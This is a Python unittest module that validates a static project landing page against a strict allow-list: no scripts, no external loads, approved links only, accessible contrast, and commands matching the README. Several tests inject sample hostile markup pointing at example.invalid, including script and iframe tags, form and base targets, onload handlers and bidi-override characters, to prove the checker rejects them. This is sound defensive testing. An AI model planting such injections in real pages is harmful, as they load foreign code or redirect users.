"""The landing page, docs/index.html, loads nothing from another origin and says only what the repo shows.

    python3 -m unittest discover -s checks -v

GitHub Pages serves docs/ from main as it stands, with no build step (docs/.nojekyll). The page is a test of this
repo, not a reference check. The test reads the page strictly and fails on what it does not know:

- the page is strict UTF-8, holds no control character but the newline and no character that reorders text, and
  starts with "<!DOCTYPE html>"
- html.parser reads it as well-formed: every element is one the page may hold, with only the attributes it may
  have, each once; every element that is opened is closed, in order; a void element is never closed; there is no
  comment, no processing instruction and no other declaration. There is no script, no frame, no form, no base,
  no style attribute and no event handler, because none of them is an element or an attribute the page may hold
- the figures are inline SVG of seven elements, svg, g, path, circle, rect, line and text, and title, each with only
  the attributes listed for it. There is no use, image, link, script, style, foreignObject, marker, gradient,
  filter or animation element in an <svg>, and no href. A value in an <svg> is numbers and words, calls no function
  but translate() and rotate(), and a fill or a stroke is none or currentColor. Each <svg> has role="img" and one
  <title> directly in it, which its aria-labelledby names, and the only other <title> is the one in <head>
- nothing is loaded from another origin: what an element loads (img src, source srcset, link href) is the name of
  a file in docs/. The CSS in the one <style> element has no at-rule but @media and @keyframes, no function but
  var(), no backslash and no "url", so it loads nothing either
- the CSS moves the page only inside @media (prefers-reduced-motion: no-preference): an animation, a
  transition or scroll-behavior, also with a vendor prefix such as -webkit-, stands in that query, or in a
  @keyframes. A prefixed at-rule, such as @-webkit-keyframes, is not an at-rule the CSS may hold
- a link (a href) goes to a file in docs/, to an id on the page, or into the repo on GitHub: the repo itself, a
  file or a directory on main that exists in this checkout, a pull request, an issue, or the latest release. The
  only links out of the repo are to the sources in sources.json, one each, matched whole: the repo of a source, or
  for a source with a directory, that directory at HEAD. Nothing else links out to another site. A fragment on a link to the page, "#..." or "index.html#...", is an id
  on the page, and the ids on the page stand once each. A link to a logo has no fragment. A link into the repo
  may end in a fragment of the form of an id, and whether GitHub shows that id is not checked
- docs/ holds exactly the page, .nojekyll and the two logos, and each logo is byte for byte its copy in assets/
- the page has one h1, its headings do not skip a level, html has lang="en" and every image has alt text
- the colors are a palette of custom properties, one for light and one for dark, and each pair of text and
  background in it, in the light bands, the dark bands ("ink") and the orange one ("go"), has a contrast ratio of at
  least 4.5 (WCAG 2, level AA). No other hex color is written.
- every command on the page, a line of a <pre><code> block, is a line of a code block marked sh in README.md
- the list of sources, <ul class="sources">, holds one item for each source in sources.json, in its order. Each
  item starts with a link to the source, named by its name, gives its license once in an element of the class
  "license", and names in <code>, in the order of ratchet.json, exactly the rules whose source cites it
- each step of a diagram, an item of an <ol class="flow">, links to where the repo shows it
- the dial of the principles, <svg class="fig-dial">, labels its notches with the titles of the principles in
  ratchet.json, "01 " and the first, and so on, in order, and holds no other <text>. The list <ol
  class="principle-list">, for a narrow screen, holds the same titles in the same order. A principle added, removed,
  moved or renamed fails until the dial is drawn again and the list follows. generate.py writes neither, since the
  place and wrapping of each label are part of the drawing.

The line that fetches Ratchet is checked by generate.py, which writes it: it names the newest version with a date
in CHANGELOG.md, as the command in README.md does, so a release that moves the README moves the page when
generate.py is run, and generate.py --check fails until it is. The line that gives the count of rules and the cap
on experimental rules is written the same way, from ratchet.json. The tests of both are here too, and they read
each line as generate.py does, after the spaces that indent it.

What the test does not claim: that a browser shows the page as intended, that a named color is legible (it reads
hex colors only), that the border of a box stands out from the background (--edge is not checked: a box says
nothing that its text and its place in the list do not), or that the text is true. The text is taken
from README.md and the files the page links to, and read by the maintainer. What a source gives Ratchet is in
Ratchet's own words, and the test does not see whether anything was copied. That
Pages is turned on is a setting of the repository. Each case is the page with one change, so the cases follow the
page when it changes. Standard library only.
"""

import html.parser
import json
import os
import re
import shutil
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import generate  # noqa: E402
import registry  # noqa: E402
from test_checks import ROOT, RepoCopy, first_entry, run  # noqa: E402

DOCS = "docs"
PAGE = "index.html"
REPO = "https://github.com/fabian-von-tiedemann/ratchet"
FETCH = "git clone --branch v%s https://github.com/fabian-von-tiedemann/ratchet .ratchet"
# Every file in docs/. A logo is a copy of the file of the same name in assets/.
FILES = (".nojekyll", "index.html", "ratchet-dark.svg", "ratchet-light.svg")
LOGOS = ("ratchet-dark.svg", "ratchet-light.svg")
VOID = {"meta", "link", "img", "source", "br"}
GLOBAL = {"id", "class"}
# Every element the page may hold, with the attributes it may have beside id and class.
ELEMENTS = {
    "html": {"lang"}, "head": set(), "meta": {"charset", "name", "content"}, "title": set(), "link": {"rel", "href", "type"},
    "style": set(), "body": set(), "header": set(), "nav": set(), "main": set(), "section": set(), "footer": set(),
    "h1": set(), "h2": set(), "h3": set(), "p": set(), "ul": set(), "ol": set(), "li": set(), "a": {"href"},
    "strong": set(), "em": set(), "code": set(), "pre": set(), "br": set(), "span": set(),
    "picture": set(), "source": {"media", "srcset"}, "img": {"src", "width", "height", "alt"},
    "svg": {"viewbox", "width", "height", "role", "aria-labelledby", "fill", "stroke", "stroke-width", "stroke-linejoin",
            "stroke-linecap", "font-family", "font-size"},
}
# Every element an <svg> may hold, with the attributes it may have beside id and class, as html.parser names them. There
# is no use, image, link, script, style, foreignObject, marker, gradient, filter or animation element, and no href.
SVG_ELEMENTS = {
    "title": set(), "g": {"fill", "stroke", "transform"}, "path": {"d"}, "circle": {"cx", "cy", "r"},
    "rect": {"x", "y", "width", "height", "rx"}, "line": {"x1", "y1", "x2", "y2"}, "text": {"x", "y", "text-anchor", "transform"},
}
# The value of an attribute of an <svg> or in one: numbers and words, and no function but translate() and rotate(). So
# no url(), no colon and no character reference that spells one. A fill or a stroke is none or the color of the text.
SVG_VALUE = re.compile(r"[A-Za-z0-9 .,()-]*\Z")
SVG_FUNCTIONS = {"translate", "rotate"}
PAINT = {"none", "currentColor"}
# What an element loads: the attribute that names a file.
LOADS = {("img", "src"), ("source", "srcset"), ("link", "href")}
META = {"viewport", "description", "color-scheme"}
FILE = re.compile(r"[a-z0-9][a-z0-9.-]*\Z")
FRAGMENT = re.compile(r"#[a-z0-9]+(?:-[a-z0-9]+)*\Z")
# A path on main: parts that may start with one dot, as .github does, so no part is "." or "..".
REPO_PATH = re.compile(r"(?:\.?[A-Za-z0-9_][A-Za-z0-9_.-]*/)*\.?[A-Za-z0-9_][A-Za-z0-9_.-]*")
REPO_LINK = re.compile(
    r"(?:/(?P<kind>blob|tree)/main/(?P<path>%s)|/(?:pull|issues)/[1-9][0-9]*|/releases/latest)?(?:#[a-z0-9]+(?:-[a-z0-9]+)*)?\Z"
    % REPO_PATH.pattern
)
# Characters the page may not hold: controls but the newline, and the ones that reorder or hide text.
HIDDEN = re.compile("[\x00-\x09\x0b-\x1f\x7f-\x9f\u200b-\u200f\u202a-\u202e\u2060-\u2069\ufeff]")
CSS_FUNCTION = re.compile(r"([A-Za-z_-][A-Za-z0-9_-]*)\(")
CSS_AT = re.compile(r"@([A-Za-z-]+)")
HEX = re.compile(r"#[0-9A-Fa-f]{3,8}\b")
PALETTE = re.compile(r"--([a-z]+(?:-[a-z]+)*):\s*(#[0-9a-f]{6});")
ROOT_BLOCK = re.compile(r":root\s*\{([^{}]*)\}")
DARK = "@media (prefers-color-scheme: dark)"
# The only query in which the CSS may move the page: a visitor who asked for less motion sees none.
REDUCED = "@media (prefers-reduced-motion: no-preference)"
AT_RULES = {"media", "keyframes"}
# A property that moves the page, an animation, a transition or smooth scrolling, with or without a vendor prefix such as -webkit-, -moz-, -o- or -ms-: any one word
# between dashes before the name counts as one. A prefixed at-rule, such as @-webkit-keyframes, is not in AT_RULES.
MOTION = re.compile(r"(?:-[a-z]+-)?(?:animation(?:-[a-z]+)*|transition(?:-[a-z]+)*|scroll-behavior)\Z")
# Pairs of text and background in the palette, each to have a contrast ratio of at least 4.5. The "ink" colors are the
# dark bands, and "go" the orange one, which the CSS sets in place of fg, muted, link, accent, box and code. The "$"
# before a command is --ink-accent, also on the code of the orange band.
PAIRS = (("fg", "bg"), ("muted", "bg"), ("link", "bg"), ("fg", "code-bg"), ("code-fg", "code-bg"), ("fg", "box"), ("muted", "box"),
         ("link", "box"), ("accent", "bg"), ("accent", "box"),
         ("ink-fg", "ink-bg"), ("ink-muted", "ink-bg"), ("ink-accent", "ink-bg"), ("ink-fg", "ink-box"), ("ink-muted", "ink-box"),
         ("ink-accent", "ink-box"), ("ink-fg", "ink-code"), ("go-fg", "signal"), ("go-code-fg", "go-code-bg"),
         ("ink-accent", "go-code-bg"))
# The lists whose items the test reads one by one: the sources, and the steps of a diagram.
ITEM_LISTS = {"ul": "sources", "ol": "flow"}
KEY = re.compile(r"ratchet\.[a-z0-9]+(?:-[a-z0-9]+)*\Z")
CONTRAST = 4.5


class PageReader(html.parser.HTMLParser):
    """Reads the page and collects what is wrong with its form, what it loads and links to, its ids and commands."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.problems = []
        self.stack = []
        self.seen_doctype = False
        self.started = False
        self.loads, self.links, self.ids, self.headings, self.images = [], [], [], [], []
        self.commands, self.styles, self.counts = [], [], {}
        self.text_in = None
        # The classes of each open element, beside self.stack. An item of a list in ITEM_LISTS, a <li> whose list has
        # that class, records the links in it with their text, the text of each <code>, and the text of each element
        # of the class "license". Each capture is [depth, field, href, parts], and ends when its element is closed.
        self.classes, self.items, self.captures = [], [], []
        self.item, self.item_at = None, None
        # Each list on the page, as (its tag, the classes of its class attribute), in order.
        self.lists = []
        # Each <svg>, with its role, the id its aria-labelledby names, and the ids of the <title> elements directly in it.
        self.figures, self.head_titles = [], 0

    def where(self):
        return "line %d" % self.getpos()[0]

    def handle_decl(self, decl):
        if decl != "DOCTYPE html" or self.started or self.seen_doctype:
            self.problems.append("%s: the only declaration is <!DOCTYPE html>, first, found <!%s>" % (self.where(), decl))
        self.seen_doctype = True

    def handle_starttag(self, tag, attrs):
        self.start(tag, attrs, closed=False)

    def handle_startendtag(self, tag, attrs):
        self.start(tag, attrs, closed=True)

    def start(self, tag, attrs, closed):
        self.started = True
        in_svg = "svg" in self.stack
        table = SVG_ELEMENTS if in_svg else ELEMENTS
        if tag not in table:
            self.problems.append("%s: <%s> is not an element this page may hold%s" % (self.where(), tag, " in an <svg>" if in_svg else ""))
        if closed and tag not in VOID:
            self.problems.append("%s: <%s/> is not closed by its slash, only a void element may end so" % (self.where(), tag))
        self.counts[tag] = self.counts.get(tag, 0) + 1
        names = [name for name, _ in attrs]
        values = {}
        for name, value in attrs:
            if names.count(name) > 1 and name not in values:
                self.problems.append("%s: <%s> has the attribute %s twice" % (self.where(), tag, name))
            values.setdefault(name, value)
            if name not in GLOBAL and name not in table.get(tag, set()):
                self.problems.append("%s: <%s> may not have the attribute %s" % (self.where(), tag, name))
            elif value is None:
                self.problems.append("%s: <%s> has the attribute %s without a value" % (self.where(), tag, name))
            elif (in_svg or tag == "svg") and name in ("fill", "stroke") and value not in PAINT:
                self.problems.append("%s: <%s> has %s=%r, and a fill or a stroke is none or currentColor" % (self.where(), tag, name, value))
            elif (in_svg or tag == "svg") and (not SVG_VALUE.match(value) or set(CSS_FUNCTION.findall(value)) - SVG_FUNCTIONS):
                self.problems.append("%s: <%s> has %s=%r, and a value in an <svg> is numbers and words, and calls only translate() "
                                     "and rotate()" % (self.where(), tag, name, value))
            elif (tag, name) in LOADS:
                self.loads.append((self.where(), tag, value))
            elif (tag, name) == ("a", "href"):
                self.links.append((self.where(), value))
            elif name == "id":
                self.ids.append(value)
        if tag == "html" and values.get("lang") != "en":
            self.problems.append('%s: <html> must have lang="en"' % self.where())
        if tag == "meta" and not (values == {"charset": "utf-8"} or (set(values) == {"name", "content"} and values["name"] in META)):
            self.problems.append('%s: a <meta> is charset="utf-8", or a name among %s with content' % (self.where(), ", ".join(sorted(META))))
        if tag == "link" and (values.get("rel") != "icon" or "href" not in values):
            self.problems.append('%s: the only <link> is rel="icon" with an href' % self.where())
        if tag == "a" and "href" not in values:
            self.problems.append("%s: an <a> has an href" % self.where())
        if tag == "img":
            self.images.append((self.where(), values.get("alt")))
        if tag == "svg" and not in_svg:
            self.figures.append({"where": self.where(), "role": values.get("role"), "labelledby": values.get("aria-labelledby"),
                                 "titles": [], "classes": (values.get("class") or "").split()})
        if tag == "title":
            if self.stack[-1:] == ["head"]:
                self.head_titles += 1
            elif self.stack[-1:] == ["svg"] and self.figures:
                self.figures[-1]["titles"].append(values.get("id"))
            else:
                self.problems.append("%s: a <title> stands in <head>, or directly in an <svg> as its name" % self.where())
        if tag == "source" and self.stack[-1:] != ["picture"]:
            self.problems.append("%s: a <source> stands in a <picture>" % self.where())
        if re.fullmatch(r"h[1-6]", tag):
            self.headings.append((self.where(), int(tag[1])))
        if tag == "code" and self.stack[-1:] == ["pre"]:
            self.text_in = []
        classes = (values.get("class") or "").split()
        if tag in ITEM_LISTS:
            self.lists.append((tag, classes))
        if tag == "li" and self.stack and ITEM_LISTS.get(self.stack[-1]) in self.classes[-1]:
            self.item = {"list": ITEM_LISTS[self.stack[-1]], "where": self.where(), "links": [], "codes": [], "licenses": []}
            self.items.append(self.item)
            self.item_at = len(self.stack)
        elif self.item is not None and tag not in VOID:
            if tag == "a":
                self.captures.append([len(self.stack), "links", values.get("href"), []])
            if tag == "code":
                self.captures.append([len(self.stack), "codes", None, []])
            if "license" in classes:
                self.captures.append([len(self.stack), "licenses", None, []])
        if tag not in VOID:
            self.stack.append(tag)
            self.classes.append(classes)

    def handle_endtag(self, tag):
        if tag in VOID:
            self.problems.append("%s: </%s> closes a void element" % (self.where(), tag))
            return
        if not self.stack or self.stack[-1] != tag:
            self.problems.append("%s: </%s> does not close the element that is open, %s"
                                 % (self.where(), tag, "<%s>" % self.stack[-1] if self.stack else "none"))
            if tag in self.stack:
                at = self.stack.index(tag)
                del self.stack[at:], self.classes[at:]
                self.close_items()
            return
        self.stack.pop()
        self.classes.pop()
        self.close_items()
        if tag == "code" and self.text_in is not None:
            self.commands += "".join(self.text_in).split("\n")
            self.text_in = None

    def close_items(self):
        """End the captures and the item whose elements are no longer open."""
        while self.captures and self.captures[-1][0] >= len(self.stack):
            _, field, href, parts = self.captures.pop()
            text = " ".join("".join(parts).split())
            self.item[field].append((href, text) if field == "links" else text)
        if self.item is not None and self.item_at >= len(self.stack):
            self.item, self.item_at = None, None

    def handle_data(self, data):
        if data.strip():
            self.started = True
        for capture in self.captures:
            capture[3].append(data)
        if self.text_in is not None:
            self.text_in.append(data)
        if self.stack[-1:] == ["style"]:
            self.styles.append(data)

    def handle_comment(self, data):
        self.problems.append("%s: a comment, which the page does not hold" % self.where())

    def handle_pi(self, data):
        self.problems.append("%s: a processing instruction, which the page does not hold" % self.where())

    def unknown_decl(self, data):
        self.problems.append("%s: a declaration <![%s]>, which the page does not hold" % (self.where(), data))


def luminance(color):
    channels = []
    for at in (1, 3, 5):
        value = int(color[at:at + 2], 16) / 255
        channels.append(value / 12.92 if value <= 0.04045 else ((value + 0.055) / 1.055) ** 2.4)
    return 0.2126 * channels[0] + 0.7152 * channels[1] + 0.0722 * channels[2]


def contrast(one, other):
    high, low = sorted((luminance(one), luminance(other)), reverse=True)
    return (high + 0.05) / (low + 0.05)


def css_problems(css):
    problems = []
    if "\\" in css:
        problems.append("the CSS holds a backslash, which could spell a word the check does not see")
    if "url" in css.lower():
        problems.append('the CSS holds "url", and loads nothing')
    for name in sorted(set(CSS_FUNCTION.findall(css)) - {"var"}):
        problems.append("the CSS calls %s(), and the only function it may call is var()" % name)
    for name in sorted(set(CSS_AT.findall(css)) - AT_RULES):
        problems.append("the CSS holds @%s, and the only at-rules it may hold are @media and @keyframes" % name)
    problems += motion_problems(css)
    blocks = ROOT_BLOCK.findall(css)
    dark = css.find(DARK)
    roots = [match.start() for match in ROOT_BLOCK.finditer(css)]
    if len(blocks) != 2 or dark < 0 or not (roots[0] < dark < roots[1]):
        problems.append("the CSS has two :root blocks of colors, the first for light and the second inside %s" % DARK)
        return problems
    palettes = [dict(PALETTE.findall(block)) for block in blocks]
    if sum(len(PALETTE.findall(block)) for block in blocks) != len(HEX.findall(css)):
        problems.append("the CSS writes a hex color outside the two palettes, or one that is not #rrggbb in lower case")
    for scheme, palette in zip(("light", "dark"), palettes):
        for text, background in PAIRS:
            if text not in palette or background not in palette:
                problems.append("the %s palette has no --%s or no --%s" % (scheme, text, background))
                continue
            ratio = contrast(palette[text], palette[background])
            if ratio < CONTRAST:
                problems.append("in the %s palette, --%s on --%s has a contrast ratio of %.2f, under %.1f"
                                % (scheme, text, background, ratio, CONTRAST))
    if set(palettes[0]) != set(palettes[1]):
        problems.append("the light and the dark palette name different colors")
    return problems


def motion_problems(css):
    """Why the CSS moves the page for a visitor who asked for less motion: an animation outside the query REDUCED.

    The CSS is read as blocks, each opened by what stands before its "{". A declaration of animation, of a property
    animation-*, of transition, of a property transition-*, or of scroll-behavior, with or without a vendor prefix,
    stands in a block inside REDUCED, written so, or inside a @keyframes, which only says how an animation moves. Comments are removed
    first, so a brace in a comment is not read, but a brace in a string is read as a brace.
    """
    problems, blocks, start = [], [], 0
    css = re.sub(r"/\*.*?\*/", "", css, flags=re.S)
    for at, char in enumerate(css):
        if char not in "{};":
            continue
        text, start = " ".join(css[start:at].split()), at + 1
        if char == "{":
            blocks.append(text)
            continue
        name = text.partition(":")[0].strip().lower()
        if blocks and ":" in text and MOTION.match(name) and not any(block == REDUCED or block.startswith("@keyframes ") for block in blocks):
            problems.append("the CSS declares %s in %s, and so moves the page outside %s" % (name, " ".join(blocks), REDUCED))
        if char == "}":
            if not blocks:
                problems.append("the CSS has a brace that is not matched: a } with no block open")
                continue
            blocks.pop()
    if blocks:
        problems.append("the CSS has a brace that is not matched: %s is never closed" % blocks[-1])
    return problems


def readme_commands(readme):
    """Every line of a code block marked sh in README.md, without the spaces that indent it."""
    lines, language = set(), None
    for line in readme.split("\n"):
        bare = line.lstrip(" ")
        if bare.startswith("```"):
            language = bare[3:] if language is None else None
        elif language == "sh":
            lines.add(bare)
    return lines


def page_problems(root):
    """Everything wrong with docs/ in the checkout at root, as a list of messages that name the file."""
    docs = os.path.join(root, DOCS)
    name = "%s/%s" % (DOCS, PAGE)
    if not os.path.isdir(docs):
        return ["%s/: there is no such directory" % DOCS]
    problems = []
    present = sorted(os.listdir(docs))
    if tuple(present) != FILES:
        problems.append("%s/ must hold exactly %s, found %s" % (DOCS, ", ".join(FILES), ", ".join(present) or "nothing"))
    for logo in LOGOS:
        paths = os.path.join(docs, logo), os.path.join(root, "assets", logo)
        if all(os.path.isfile(path) and not os.path.islink(path) for path in paths):
            with open(paths[0], "rb") as one, open(paths[1], "rb") as other:
                if one.read() != other.read():
                    problems.append("%s/%s is not byte for byte assets/%s" % (DOCS, logo, logo))
    path = os.path.join(docs, PAGE)
    if os.path.islink(path) or not os.path.isfile(path):
        return problems + ["%s: there is no such file" % name]
    with open(path, "rb") as handle:
        data = handle.read()
    try:
        text = data.decode("utf-8", errors="strict")
    except UnicodeDecodeError as error:
        return problems + ["%s: not valid UTF-8 at byte %d" % (name, error.start)]
    for number, line in enumerate(text.split("\n"), 1):
        for match in HIDDEN.finditer(line):
            problems.append("%s:%d: holds U+%04X, a control or a character that reorders or hides text" % (name, number, ord(match.group())))
    if not text.startswith("<!DOCTYPE html>\n"):
        problems.append("%s: does not start with <!DOCTYPE html> and a newline" % name)

    reader = PageReader()
    reader.feed(text)
    reader.close()
    found = ["%s: %s" % (name, problem) for problem in reader.problems]
    if reader.stack:
        found.append("%s: elements opened and never closed: %s" % (name, ", ".join("<%s>" % tag for tag in reader.stack)))
    if reader.rawdata:
        found.append("%s: html.parser did not read the end of the page" % name)
    for tag in ("html", "head", "body", "main", "h1", "style"):
        if reader.counts.get(tag, 0) != 1:
            found.append("%s: holds <%s> %d times, and must hold it once" % (name, tag, reader.counts.get(tag, 0)))
    if reader.head_titles != 1:
        found.append("%s: holds <title> %d times in <head>, and must hold it once" % (name, reader.head_titles))
    for figure in reader.figures:
        if figure["role"] != "img" or len(figure["titles"]) != 1 or not figure["titles"][0] or figure["labelledby"] != figure["titles"][0]:
            found.append('%s: %s: an <svg> has role="img" and one <title> directly in it, whose id its aria-labelledby names'
                         % (name, figure["where"]))
    level = 0
    for where, heading in reader.headings:
        if heading > level + 1:
            found.append("%s: %s: <h%d> after <h%d> skips a level" % (name, where, heading, level))
        level = heading
    if reader.headings[:1] and reader.headings[0][1] != 1:
        found.append("%s: the first heading is not <h1>" % name)
    for where, alt in reader.images:
        if not alt or not alt.strip():
            found.append("%s: %s: an <img> without alt text" % (name, where))
    for where, tag, value in reader.loads:
        if not FILE.match(value) or value not in FILES or value == ".nojekyll":
            found.append("%s: %s: <%s> loads %r, and the page loads only a file in %s/ by its name" % (name, where, tag, value, DOCS))
    duplicates = sorted(set(each for each in reader.ids if reader.ids.count(each) > 1))
    if duplicates:
        found.append("%s: ids that stand more than once: %s" % (name, ", ".join(duplicates)))
    try:
        sources = registry.load_sources(os.path.join(root, "sources.json"))
        data = registry.load(os.path.join(root, "ratchet.json"))
    except registry.RegistryError as error:
        sources, data = [], None
        found.append("%s: the sources and the rules cannot be read: %s" % (name, error))
    # The page is the one page in docs/ (FILES), so its ids, as html.parser read them, are the ids a fragment may name.
    outside = set(source_link(source) for source in sources)
    for where, value in reader.links:
        problem = link_problem(root, value, {PAGE: reader.ids}, outside)
        if problem:
            found.append("%s: %s: the link %r %s" % (name, where, value, problem))
    if data is not None:
        found += ["%s: %s" % (name, problem) for problem in source_problems(reader.items, sources, data)]
    for item in reader.items:
        if item["list"] == "flow" and not any(into_repo(href) for href, _ in item["links"]):
            found.append("%s: %s: a step of a diagram that links nowhere in this repo. Each step links to where the repo shows it"
                         % (name, item["where"]))
    found += ["%s: %s" % (name, problem) for problem in css_problems("".join(reader.styles))]
    readme_path = os.path.join(root, "README.md")
    with open(readme_path, encoding="utf-8", errors="strict") as handle:
        allowed = readme_commands(handle.read())
    for command in reader.commands:
        if command not in allowed:
            found.append("%s: the command %r is not a line of a code block marked sh in README.md" % (name, command))
    if not reader.commands:
        found.append("%s: holds no command" % name)
    return problems + found


def source_link(source):
    """The one link out of the repo that the page may hold for a source in sources.json: its repo, or its directory.

    The link names no commit, so a pin that moves in sources.json does not make the page stale. The commit is in
    sources.json, which the page links to.
    """
    if "directory" in source:
        return "%s/tree/HEAD/%s" % (source["repo"], source["directory"])
    return source["repo"]


def source_problems(items, sources, data):
    """Why the list of sources on the page is not sources.json, with the rules in ratchet.json that cite each.

    The list is a <ul class="sources"> with one <li> per source, in the order of sources.json. Each item starts with
    a link to the source, named by its name, holds its license once in an element of the class "license", and
    names in <code>, in the order of ratchet.json, exactly the rules whose source cites it.
    """
    items = [item for item in items if item["list"] == "sources"]
    if len(items) != len(sources):
        return ["the list of sources holds %d items, and sources.json %d sources. It holds one item for each source, in the "
                "order of sources.json" % (len(items), len(sources))]
    cited = {}
    for rule in data["rules"]:
        for each in registry.cited_names(rule):
            cited.setdefault(each, []).append(rule["key"])
    problems = []
    for item, source in zip(items, sources):
        link = (source_link(source), source["name"])
        if item["links"][:1] != [link]:
            problems.append("%s: the list of sources, in the order of sources.json, has here the item for %s. It starts with a link "
                            "to %s named %s, found %r" % (item["where"], source["name"], link[0], link[1], item["links"][:1]))
            continue
        if item["licenses"] != [source["license"]]:
            problems.append("%s: the item for %s gives the license %r, and sources.json %r, once, in an element of the class "
                            "license" % (item["where"], source["name"], item["licenses"], source["license"]))
        keys = cited.get(source["name"], [])
        if item["codes"] != keys or not all(KEY.match(key) for key in item["codes"]):
            problems.append("%s: the item for %s names the rules %s, and the rules in ratchet.json that cite it are %s"
                            % (item["where"], source["name"], ", ".join(item["codes"]) or "none", ", ".join(keys) or "none"))
    return problems


def link_problem(root, value, ids, outside=()):
    """Why a link on the page is not allowed, or None. ids maps each page in docs/ to the ids on it.

    A link into the repo may end in a fragment of the form of an id, which is not checked against GitHub. A link
    to a page in docs/, or to "#..." on this page, has a fragment only if it is an id on that page. The only links
    out of the repo are those in outside, each matched whole: the link to each source in sources.json.
    """
    if value in outside:
        return None
    if value.startswith(REPO):
        match = REPO_LINK.match(value[len(REPO):])
        if not match:
            return ("goes into the repo, but not to the repo, a file or directory on main, a pull request, an issue or the "
                    "latest release")
        if match.group("kind"):
            target = os.path.join(root, *match.group("path").split("/"))
            if match.group("kind") == "blob" and not os.path.isfile(target):
                return "names a file that is not in this checkout"
            if match.group("kind") == "tree" and not os.path.isdir(target):
                return "names a directory that is not in this checkout"
        return None
    target, mark, fragment = value.partition("#")
    nowhere = "leads neither to a file in %s/, nor to an id on the page, nor into the repo on GitHub" % DOCS
    if target and not (FILE.match(target) and target in FILES and target != ".nojekyll"):
        return nowhere
    if not mark:
        return None if target else nowhere
    page = target or PAGE
    if page not in ids:
        return "has a fragment, and only a link to a page in %s/ may have a fragment" % DOCS
    if not FRAGMENT.match(mark + fragment) or fragment not in ids[page]:
        return "names #%s, which is not an id on %s" % (fragment, page)
    return None


def into_repo(href):
    """Whether a link leads into this repo on GitHub, as a step of a diagram must: not out of it, and not to this page."""
    return isinstance(href, str) and (href == REPO or href.startswith(REPO + "/"))


def lines_that_hold(text, marker):
    """The lines of the page that hold marker, without the spaces that indent them, as generate.py reads them."""
    return [line.lstrip(" ") for line in text.split("\n") if marker in line]


class Page(RepoCopy, unittest.TestCase):
    """The page as it stands passes, and each change below fails with its message."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        text = self.page()
        self.assertIn(old, text, "the test expects %r on the page" % old)
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text.replace(old, new, 1))

    def assert_fails(self, *message):
        """One problem holds every part of the message."""
        problems = page_problems(self.copy)
        self.assertTrue(any(all(part in problem for part in message) for problem in problems), "%r not in %r" % (message, problems))

    def test_the_page_as_it_stands_passes(self):
        self.assertEqual(page_problems(ROOT), [])
        self.assertEqual(page_problems(self.copy), [])

    def test_the_page_names_what_it_must(self):
        text = self.page()
        released = generate.changelog_context(self.copy)[1]
        for words in (FETCH % released, "python3 .ratchet/checks/init.py --check", "python3 .ratchet/checks/init.py</code>",
                      REPO + "/releases/latest", REPO + "/blob/main/LICENSE", 'href="%s"' % REPO,
                      "<h2 id=\"start-here\">Start here</h2>", "prefers-color-scheme: dark", "The honest limits",
                      "Evidence from this repo", "How the ratchet turns", "How this repo is run", "What Ratchet builds on",
                      "How it stays tight", '<a class="button" href="#start-here">Start here</a>'):
            self.assertIn(words, text)

    def test_no_page_fails(self):
        shutil.rmtree(os.path.join(self.copy, DOCS))
        self.assert_fails("docs/: there is no such directory")

    def test_a_file_in_docs_that_is_not_known_fails(self):
        for extra in ("404.html", "CNAME", "_config.yml"):
            with self.subTest(extra=extra):
                self.setUp()
                with open(os.path.join(self.copy, DOCS, extra), "w", encoding="utf-8") as handle:
                    handle.write("x\n")
                self.assert_fails("docs/ must hold exactly")

    def test_no_nojekyll_fails(self):
        os.remove(os.path.join(self.copy, DOCS, ".nojekyll"))
        self.assert_fails("docs/ must hold exactly")

    def test_a_logo_that_is_not_the_repos_fails(self):
        with open(os.path.join(self.copy, DOCS, "ratchet-dark.svg"), "a", encoding="utf-8") as handle:
            handle.write("<!-- -->\n")
        self.assert_fails("docs/ratchet-dark.svg is not byte for byte assets/ratchet-dark.svg")

    def test_a_page_that_is_not_utf8_fails(self):
        with open(os.path.join(self.copy, DOCS, PAGE), "ab") as handle:
            handle.write(b"\xff\n")
        self.assert_fails("docs/index.html: not valid UTF-8 at byte")

    def test_a_hidden_character_fails(self):
        for character in ("\r", "\t", "\u202e", "\u200b", "\ufeff", "\x00"):
            with self.subTest(code="%04X" % ord(character)):
                self.setUp()
                self.change("<h1>Ratchet</h1>", "<h1>Ratchet%s</h1>" % character)
                self.assert_fails("holds U+%04X" % ord(character))

    def test_a_page_without_its_doctype_fails(self):
        self.change("<!DOCTYPE html>\n", "")
        self.assert_fails("does not start with <!DOCTYPE html>")

    def test_a_script_fails_in_every_form(self):
        for script in ('<script src="https://example.invalid/t.js"></script>', "<script>document.title = 'x'</script>",
                       '<SCRIPT src="t.js"></SCRIPT>', '<iframe src="https://example.invalid/"></iframe>',
                       '<object data="https://example.invalid/x"></object>', '<embed src="https://example.invalid/x">',
                       '<base href="https://example.invalid/">', '<form action="https://example.invalid/"></form>',
                       '<svg><image href="https://example.invalid/x.png"></image></svg>', '<audio src="x.mp3"></audio>'):
            with self.subTest(script=script):
                self.setUp()
                self.change("</main>", script + "\n</main>")
                self.assert_fails("is not an element this page may hold")

    def test_an_event_handler_or_a_style_attribute_fails(self):
        for attribute, name in (('onload="x()"', "onload"), ('style="background: url(https://example.invalid/x.png)"', "style"),
                                ('srcset="https://example.invalid/x.png 2x"', "srcset"), ('loading="lazy"', "loading")):
            with self.subTest(attribute=attribute):
                self.setUp()
                self.change('<img src="ratchet-light.svg"', '<img %s src="ratchet-light.svg"' % attribute)
                self.assert_fails("<img> may not have the attribute %s" % name)

    def test_a_load_from_another_origin_fails(self):
        for old, new in (('<img src="ratchet-light.svg"', '<img src="https://example.invalid/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="//example.invalid/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="&#104;ttps://example.invalid/x.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="' + REPO + '/raw/main/assets/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="../assets/ratchet-light.svg"'),
                         ('srcset="ratchet-dark.svg"', 'srcset="https://example.invalid/ratchet-dark.svg"'),
                         ('<link rel="icon" href="ratchet-light.svg"', '<link rel="icon" href="https://example.invalid/i.svg"')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
